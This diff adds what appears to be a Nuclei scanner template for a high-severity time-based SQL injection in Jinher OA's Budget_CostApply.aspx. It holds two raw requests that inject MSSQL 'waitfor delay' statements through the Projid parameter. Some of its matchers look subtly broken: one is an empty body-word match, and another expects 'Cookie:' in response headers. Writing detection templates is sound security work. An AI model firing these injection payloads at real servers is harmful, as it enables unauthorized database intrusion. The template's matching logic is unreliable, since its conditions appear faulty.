@@ -1,0 +1,35 @@
+id: poc-yaml-jinher-jhsoft-budget-costapply-aspx-sqli
+info:
+  name: "金和 OA Budget_CostApply.aspx SQL 注入"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 金和
+
+http:
+  - raw:
+      - |
+        GET /c6/JHSoft.Web.CostControl/BudgetExecution/Budget_CostApply.aspx/?Projid=1'waitfor+delay%270:0:5%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /c6/JHSoft.Web.CostControl/BudgetExecution/Budget_CostApply.aspx/?Projid=1'waitfor+delay%270:0:8%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: word
+        part: header
+        words:
+          - "Cookie:"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
